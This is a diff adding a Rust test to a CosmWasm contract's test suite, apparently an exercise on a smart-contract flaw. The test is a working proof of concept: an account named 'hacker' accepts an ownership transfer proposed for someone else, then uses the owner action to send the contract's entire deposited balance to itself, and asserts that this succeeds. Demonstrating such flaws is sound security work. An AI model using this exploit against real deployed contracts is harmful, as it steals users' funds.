@@ -230,4 +230,102 @@ pub mod tests {
             }
         );
     }
+
+    #[test]
+    fn expressive_lesson() {
+        use cosmwasm_std::{CosmosMsg, BankMsg};
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Initial state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(ADMIN),
+                proposed_owner: None,
+            }
+        );
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(8_000, DENOM)],
+        )
+        .unwrap();
+
+        // Admin wants to give new_owner role to "new_owner"
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            contract_addr.clone(),
+            &ExecuteMsg::ProposeNewOwner {
+                new_owner: "new_owner".to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // "hacker" swoops in and accepts the role instead
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+        
+        // Verify that "hacker" is the new owner of the contract
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked("hacker"),
+                proposed_owner: None,
+            }
+        );
+
+        // Get balance of contract
+        let old_contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
+
+        // "hacker" sending all tokens to themselves
+        let steal_funds_msg: CosmosMsg = CosmosMsg::Bank(BankMsg::Send { 
+            to_address: "hacker".to_string(), 
+            amount: vec![coin(old_contract_bal.amount.u128(), DENOM)]
+        });
+
+        app.execute_contract(
+            Addr::unchecked("hacker"),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction { msg: steal_funds_msg },
+            &[]
+        ).unwrap();
+
+        // Assert contract now has no tokens
+        let new_contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
+        assert_eq!(new_contract_bal.amount, Uint128::zero());
+
+        // Assert "hacker" has received all the tokens
+        let hacker_bal = app.wrap().query_balance(Addr::unchecked("hacker").clone(), DENOM).unwrap();
+        assert_eq!(hacker_bal.amount, old_contract_bal.amount);
+
+    }
+
 }
